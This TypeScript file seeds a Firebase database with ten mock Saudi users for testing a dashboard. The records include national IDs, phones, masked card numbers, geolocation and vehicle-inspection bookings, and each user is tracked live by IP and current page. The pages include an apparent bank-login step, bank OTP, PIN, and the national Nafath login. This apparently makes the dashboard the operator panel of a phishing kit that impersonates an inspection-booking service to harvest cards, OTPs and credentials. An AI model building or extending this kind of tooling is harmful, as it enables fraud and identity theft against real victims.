import { db } from './firebaseConfig';
import { ref, set } from 'firebase/database';

// 🧪 بيانات تجريبية لاختبار الداشبورد
const mockUsers = [
    {
        ip: '192.168.1.101',
        name: 'محمد أحمد العتيبي',
        nationalID: '1045678901',
        phoneNumber: '0551234567',
        email: 'mohammed@example.com',
        currentPage: '/billing',
        previousPage: '/booking',
        status: 'online',
        lastSeen: Date.now() - 5000,
        hasNewData: true,
        hasPayment: true,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: true,
        newPaymentData: true,
        newContactData: false,
        newLocationData: false,
        newBookingData: false,
        isNew: false,
        payments: [
            { cardNumber: '4444 **** **** 1234', cardHolderName: 'MOHAMMED A ALOTAIBI', expirationDate: '09/27', cvv: '***' }
        ]
    },
    {
        ip: '192.168.1.102',
        name: 'عبدالله سعد القحطاني',
        nationalID: '1098765432',
        phoneNumber: '0501234567',
        email: 'abdullah@example.com',
        currentPage: '/payment',
        previousPage: '/home',
        status: 'online',
        lastSeen: Date.now() - 10000,
        hasNewData: true,
        hasPayment: false,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: true,
        newPaymentData: false,
        newContactData: true,
        newLocationData: false,
        newBookingData: false,
        isNew: true,
        payments: []
    },
    {
        ip: '192.168.1.103',
        name: 'سعود خالد الدوسري',
        nationalID: '1023456789',
        phoneNumber: '0561234567',
        email: 'saud@example.com',
        currentPage: '/rajhi',
        previousPage: '/billing',
        status: 'online',
        lastSeen: Date.now() - 15000,
        hasNewData: true,
        hasPayment: true,
        isFlagged: true,
        isBlocked: false,
        newPersonalData: false,
        newPaymentData: true,
        newContactData: false,
        newLocationData: true,
        newBookingData: false,
        isNew: false,
        payments: [
            { cardNumber: '4092 **** **** 5678', cardHolderName: 'SAUD K ALDOSARI', expirationDate: '12/26', cvv: '***' }
        ],
        location: {
            latitude: 24.7136,
            longitude: 46.6753,
            accuracy: 50,
            googleMapsUrl: 'https://www.google.com/maps?q=24.7136,46.6753',
            timestamp: Date.now() - 20000,
            permissionStatus: 'granted',
            address: {
                city: 'الرياض',
                district: 'النرجس',
                region: 'الرياض'
            }
        }
    },
    {
        ip: '192.168.1.104',
        name: 'فهد عبدالرحمن المالكي',
        nationalID: '1067891234',
        phoneNumber: '0541234567',
        email: 'fahad@example.com',
        currentPage: '/otp/bank',
        previousPage: '/rajhi',
        status: 'online',
        lastSeen: Date.now() - 30000,
        hasNewData: true,
        hasPayment: true,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: true,
        newPaymentData: false,
        newContactData: false,
        newLocationData: false,
        newBookingData: true,
        isNew: false,
        payments: [
            { cardNumber: '5123 **** **** 9012', cardHolderName: 'FAHAD A ALMALKI', expirationDate: '03/28', cvv: '***' }
        ],
        nationality: 'سعودي',
        plate: '1234 أ ب',
        vehicleType: 'سيارة',
        region: 'الرياض',
        serviceType: 'فحص دوري',
        hazardous: 'لا',
        inspectionDate: '2024-02-20',
        inspectionTime: '10:00'
    },
    {
        ip: '192.168.1.105',
        name: 'خالد محمد الشهري',
        nationalID: '1034567890',
        phoneNumber: '0571234567',
        email: 'khaled@example.com',
        currentPage: '/nafad',
        previousPage: '/otp-phone',
        status: 'online',
        lastSeen: Date.now() - 45000,
        hasNewData: false,
        hasPayment: false,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: false,
        newPaymentData: false,
        newContactData: false,
        newLocationData: false,
        newBookingData: false,
        isNew: false,
        payments: []
    },
    {
        ip: '192.168.1.106',
        name: 'عمر علي الغامدي',
        nationalID: '1056789012',
        phoneNumber: '0531234567',
        email: 'omar@example.com',
        currentPage: '/home',
        previousPage: undefined,
        status: 'offline',
        lastSeen: Date.now() - 120000,
        hasNewData: false,
        hasPayment: false,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: false,
        newPaymentData: false,
        newContactData: false,
        newLocationData: false,
        newBookingData: false,
        isNew: false,
        payments: []
    },
    {
        ip: '192.168.1.107',
        name: 'تركي سلطان الحربي',
        nationalID: '1078901234',
        phoneNumber: '0591234567',
        email: 'turki@example.com',
        currentPage: '/pin',
        previousPage: '/payment',
        status: 'online',
        lastSeen: Date.now() - 8000,
        hasNewData: true,
        hasPayment: true,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: true,
        newPaymentData: true,
        newContactData: false,
        newLocationData: false,
        newBookingData: false,
        isNew: false,
        payments: [
            { cardNumber: '5555 **** **** 3456', cardHolderName: 'TURKI S ALHARBI', expirationDate: '07/25', cvv: '***' }
        ]
    },
    {
        ip: '192.168.1.108',
        name: 'ناصر حمد الزهراني',
        nationalID: '1089012345',
        phoneNumber: '0521234567',
        email: 'nasser@example.com',
        currentPage: '/new-date',
        previousPage: '/booking',
        status: 'online',
        lastSeen: Date.now() - 20000,
        hasNewData: true,
        hasPayment: false,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: false,
        newPaymentData: false,
        newContactData: false,
        newLocationData: false,
        newBookingData: true,
        isNew: true,
        payments: [],
        nationality: 'سعودي',
        plate: '5678 ب ج',
        vehicleType: 'سيارة',
        region: 'جدة'
    },
    {
        ip: '192.168.1.109',
        name: 'بندر صالح العمري',
        nationalID: '1090123456',
        phoneNumber: '0581234567',
        email: 'bandar@example.com',
        currentPage: '/call',
        previousPage: '/nafad',
        status: 'online',
        lastSeen: Date.now() - 12000,
        hasNewData: true,
        hasPayment: true,
        isFlagged: false,
        isBlocked: false,
        newPersonalData: true,
        newPaymentData: true,
        newContactData: true,
        newLocationData: false,
        newBookingData: false,
        isNew: false,
        payments: [
            { cardNumber: '4622 **** **** 7890', cardHolderName: 'BANDAR S ALOMARI', expirationDate: '11/26', cvv: '***' }
        ]
    },
    {
        ip: '192.168.1.110',
        name: 'ماجد عادل السبيعي',
        nationalID: '1012345678',
        phoneNumber: '0511234567',
        email: 'majed@example.com',
        currentPage: '/verification',
        previousPage: '/payment',
        status: 'offline',
        lastSeen: Date.now() - 300000,
        hasNewData: false,
        hasPayment: true,
        isFlagged: true,
        isBlocked: true,
        newPersonalData: false,
        newPaymentData: false,
        newContactData: false,
        newLocationData: false,
        newBookingData: false,
        isNew: false,
        payments: [
            { cardNumber: '4321 **** **** 0123', cardHolderName: 'MAJED A ALSUBAIE', expirationDate: '02/27', cvv: '***' }
        ]
    }
];

// ========= SEED FUNCTION with Error Handling =========
export const seedMockUsers = async () => {
    console.log('🔄 Starting seed process...');
    console.log('📊 Database object:', db);

    if (!db) {
        console.error('❌ Firebase not initialized. Cannot seed data.');
        alert('❌ Firebase غير متصل! تحقق من الإعدادات.');
        return;
    }

    console.log('🌱 Seeding mock users...');

    try {
        // Seed one user at a time with await
        for (const user of mockUsers) {
            const safeIp = user.ip.replace(/\./g, '_');
            console.log(`📝 Adding user: ${user.name} (${safeIp})`);
            await set(ref(db, `users/${safeIp}`), user);
        }

        console.log('✅ Mock users seeded successfully!');
        alert('✅ تم إضافة 10 مستخدمين بنجاح!');
    } catch (error) {
        console.error('❌ Error seeding data:', error);
        alert('❌ خطأ في إضافة البيانات: ' + (error as Error).message);
    }
};
